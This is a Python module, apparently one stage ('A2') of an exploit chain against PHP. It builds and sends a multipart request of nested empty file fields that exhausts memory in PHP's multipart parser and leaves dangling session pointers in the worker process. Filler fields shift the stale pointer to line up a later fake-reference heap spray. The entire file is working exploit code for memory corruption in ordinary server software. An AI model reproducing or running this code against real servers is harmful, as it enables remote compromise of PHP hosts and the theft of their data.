"""Cheap-OOM sender for the A2 stage (cross-request dangling pointer).

The multipart parser OOMs while processing nested empty file fields (before
the request reaches normal module RINIT completion). The OOM bailout skips
module shutdown, and ZendMM only resets chunk maps, so the worker retains
dangling PS(http_session_vars) / PS(id) pointers from the previous request.

This is distinct from A1 (which creates the initial stale state). A2 creates
a new dangling reference that B2's fake-ref spray can overwrite.

The --fillers parameter shifts the dangling reference within the chunk:
each filler consumes two bin-40 free-list slots (key copies), moving the
stale pointer by ~0x80 bytes in the 8M/8.4.26 layout.
"""
from __future__ import annotations

import struct

from .transport import TransportConfig, send_plain

BOUNDARY = b"C" * 10


def _nest_name(i: int, depth: int, key_pad: int = 0) -> bytes:
    return ("files[R%05d%s]" % (i, "K" * key_pad)).encode() + b"[a]" * (depth - 2)


def build_cheap_oom_body(parts: int = 880, depth: int = 64,
                         fillers: int = 0, sid: bytes = b"a" * 32,
                         progress: bytes = b"k0") -> bytes:
    """Build the A2 cheap-OOM multipart body.

    Args:
        parts: Number of nested empty file fields (each allocates a deep
               array key chain that exhausts memory).
        depth: Nesting depth of files[Rxxxxx][a]...[a] names.
        fillers: Short bin-32 fields before the nested parts. Each shifts
                 the dangling pointer within the chunk (~0x80 per filler).
        sid: PHPSESSID value.
        progress: PHP_SESSION_UPLOAD_PROGRESS value.
    """
    out = bytearray()

    def part(name: bytes, value: bytes, filename: bytes | None = None) -> None:
        out.extend(b"--" + BOUNDARY +
                   b"\r\nContent-Disposition: form-data; name=\"" + name + b"\"")
        if filename is not None:
            out.extend(b"; filename=\"" + filename + b"\"")
        out.extend(b"\r\n\r\n" + value + b"\r\n")

    part(b"PHPSESSID", sid)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)

    for i in range(fillers):
        part(("%03d" % i).encode(), b"x")

    # Nested empty file fields: the header ends at the blank line and the
    # next boundary follows immediately, so each part has an empty body.
    for i in range(parts):
        is_mixed = i == 0
        is_mixed2 = i == 1
        ctype = (b"C" * 103 if is_mixed else
                 b"C" * 231 if is_mixed2 else
                 b"application/octet-stream")
        out.extend(b"--" + BOUNDARY +
                   b"\r\nContent-Disposition: form-data; name=\"" +
                   _nest_name(i, depth) + b"\"; filename=\"\"\r\n"
                   b"Content-Type: " + ctype + b"\r\n\r\n")

    out.extend(b"--" + BOUNDARY + b"--\r\n")
    return bytes(out)


def send_cheap_oom(cfg: TransportConfig, path: str = "/index.php",
                   parts: int = 880, depth: int = 64,
                   fillers: int = 115) -> bytes:
    """Build and send the A2 cheap-OOM request."""
    body = build_cheap_oom_body(parts=parts, depth=depth, fillers=fillers)
    return send_plain(cfg, path, body)
